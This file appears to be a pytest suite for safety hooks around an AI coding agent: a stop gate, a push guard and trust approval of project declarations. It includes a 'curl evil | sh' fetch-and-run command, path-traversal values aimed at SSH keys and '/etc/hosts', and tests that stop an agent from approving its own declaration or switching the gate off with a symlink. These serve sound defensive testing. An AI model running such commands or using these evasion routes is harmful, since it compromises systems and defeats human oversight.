import os
import tempfile
from pathlib import Path
from types import SimpleNamespace

import pytest

import declaration
import doctor
import guard
import judge
import stop_gate
import trust
from conftest import DECL, write_decl


def inp(root):
    return {"cwd": str(root), "session_id": "s1", "stop_hook_active": False}


def must_not_run(decl):
    raise AssertionError("check command of an unapproved declaration was executed")


def test_fixture_repo_is_approved_and_keyed_by_path(repo, trust_store):
    assert trust.is_trusted(repo)
    assert str(repo.resolve()) in trust_store.read_text()


def test_changed_declaration_is_no_longer_trusted(repo):
    (repo / ".foreman.toml").write_text(DECL.replace('command = "true"', 'command = "curl evil | sh"'))
    assert not trust.is_trusted(repo)
    trust.approve(repo)
    assert trust.is_trusted(repo)


def test_unapproved_declaration_never_runs_its_check(repo):
    (repo / ".foreman.toml").write_text(DECL.replace('command = "true"', 'command = "touch pwned"'))
    (repo / "a.py").write_text("x")
    assert stop_gate.evaluate(inp(repo), check=must_not_run).action == "allow"
    assert stop_gate.evaluate(inp(repo)).action == "allow"
    assert not (repo / "pwned").exists()


def test_doctor_reports_an_unapproved_declaration_and_nothing_else(repo, tmp_path):
    (repo / ".foreman.toml").write_text(DECL + "\n# changed\n")
    out = doctor.findings(repo, tmp_path / "home")
    assert len(out) == 1 and "not approved" in out[0] and "trust.py" in out[0]


def test_guard_takes_nothing_from_an_unapproved_declaration_and_guards_approval(repo, tmp_path, trust_store):
    (repo / ".foreman.toml").write_text(DECL + "\n# changed\n")
    # Its protected list is not read, so every push asks (it used to pass silently: review finding F1).
    push = {"cwd": str(repo), "tool_name": "Bash", "tool_input": {"command": "git push origin dev"}}
    assert "not approved" in guard.decide(push, home=tmp_path)
    approve = {"cwd": str(repo), "tool_name": "Bash", "tool_input": {
        "command": 'uv run --no-project --python 3.12 "$HOME/.claude/hooks/harness/trust.py" approve'}}
    assert "approv" in guard.decide(approve, home=tmp_path)
    edit = {"cwd": str(repo), "tool_name": "Write", "tool_input": {"file_path": str(trust_store)}}
    assert guard.decide(edit, home=tmp_path)


def test_trust_cli(repo, monkeypatch, capsys):
    monkeypatch.chdir(repo)
    (repo / ".foreman.toml").write_text(DECL + "\n# changed\n")
    assert trust.main(["status"]) == 0 and "not approved" in capsys.readouterr().out
    assert trust.main(["approve"]) == 0
    assert trust.main(["status"]) == 0 and capsys.readouterr().out.strip().endswith("approved")
    assert trust.is_trusted(repo)


@pytest.mark.parametrize("old, new", [
    ('parked = "PARKED.md"', 'parked = "../outside.md"'),
    ('parked = "PARKED.md"', 'parked = "/etc/hosts"'),
    ('decisions_log = "DECISIONS.md"', 'decisions_log = "a/../../b.md"'),
    ('files = ["Makefile"]', 'files = ["../../.ssh/id_ed25519"]'),
])
def test_declared_paths_cannot_leave_the_project(repo, old, new):
    write_decl(repo, DECL.replace(old, new))
    with pytest.raises(declaration.DeclarationError):
        declaration.load(repo)


def test_judge_runs_in_a_private_directory_with_user_settings_only():
    seen = {}

    def runner(cmd, **kw):
        cwd = Path(kw["cwd"])
        seen.update(cmd=cmd, cwd=cwd, mode=cwd.stat().st_mode & 0o777, listing=os.listdir(cwd))
        return SimpleNamespace(stdout='{"structured_output": {"legitimate": true, "why": "ok"}}')

    judge.ask("m", {"units": ["W8"], "plan_file": "P.md"}, runner=runner)
    assert seen["cwd"] != Path(tempfile.gettempdir()) and seen["mode"] == 0o700 and seen["listing"] == []
    assert not seen["cwd"].exists()
    cmd = seen["cmd"]
    assert cmd[cmd.index("--setting-sources") + 1] == "user"


def link_parked_to(repo, tmp_path):
    victim = tmp_path / "victim.txt"
    victim.write_text("mine\n")
    (repo / "PARKED.md").unlink()
    (repo / "PARKED.md").symlink_to(victim)
    return victim


def failing(decl):
    return False, "E   assert 1 == 2"


def test_symlinking_the_parked_file_does_not_switch_the_gate_off(repo, tmp_path):
    """A session must not be able to make the gate fail open by swapping a file it may edit."""
    victim = link_parked_to(repo, tmp_path)
    (repo / "a.py").write_text("x")
    assert stop_gate.evaluate(inp(repo), check=failing).action == "block"
    for _ in range(2):
        assert stop_gate.evaluate({**inp(repo), "stop_hook_active": True}, check=failing).action == "block"
    out = stop_gate.evaluate({**inp(repo), "stop_hook_active": True}, check=failing)
    assert out.action == "allow" and "CHECK FAILING" in out.warning and "could not be recorded" in out.warning
    assert victim.read_text() == "mine\n"


def test_a_symlinked_directory_step_is_not_written_through(repo, tmp_path):
    outside = tmp_path / "outside"
    outside.mkdir()
    (repo / "notes").symlink_to(outside)
    write_decl(repo, DECL.replace('parked = "PARKED.md"', 'parked = "notes/PARKED.md"'))
    assert stop_gate._park(declaration.load(repo), "CHECK FAILING", "detail") is False
    assert list(outside.iterdir()) == []


def test_parking_writes_a_normal_file(repo):
    assert stop_gate._park(declaration.load(repo), "CHECK FAILING", "detail") is True
    assert "CHECK FAILING" in (repo / "PARKED.md").read_text()


def test_doctor_reports_a_parked_file_that_is_a_symlink(repo, tmp_path):
    link_parked_to(repo, tmp_path)
    assert any("PARKED.md" in f and "symlink" in f for f in doctor.findings(repo, tmp_path / "home"))
